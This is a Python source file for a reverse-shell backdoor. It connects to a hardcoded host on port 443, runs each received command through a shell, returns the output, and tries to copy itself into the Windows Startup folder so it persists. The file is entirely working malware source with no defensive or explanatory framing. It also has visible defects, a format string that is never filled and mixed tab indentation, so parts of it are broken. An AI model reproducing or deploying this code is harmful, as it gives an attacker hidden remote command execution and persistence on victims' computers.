import socket
import subprocess
import time
import threading
import sys
import os

IP = "127.0.0.1"
PORT = 443
CONNETION = False

def autorun():
    try:
        filename = os.path.basename(__file__)
    
        exe_fi = filename.replace(".py", ".exe")
        os.system("copy {} \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")
    except:
        pass


def connect(IP, PORT):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((IP, PORT))
        return client
    except Exception as error:
        pass


def conectiontest(client):
    try:
        client.send(b" ")
    except:
        time.sleep(5)
        connect(IP, PORT)
    else:
        return


def conection():
    while True:
        client = connect(IP, PORT)
        if client:
            listen(client)

        else:
            print("Try Again")
            time.sleep(3)


def cmd(client, data):
    try:
        client.send(b"")
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = proc.stdout.read()
        if output:
            client.send(output + b"\n")

        erroutput = proc.stderr.read()
        if erroutput:
            client.send(erroutput)

    except BrokenPipeError:
        pass
    except Exception as error:
        pass


def listen(client):
    try:

        while True:

            data = client.recv(1024).decode().strip()
            if data == "/exit":
                client.close()
            else:
                client.send(b" ")
                threading.Thread(target=cmd, args=(client, data)).start()

    except BrokenPipeError:
        time.sleep(5)
        pass
    except Exception as error:
        client.close()


if __name__ == "__main__":
    try:
	autorun()
        conection()
    except KeyboardInterrupt:
        pass

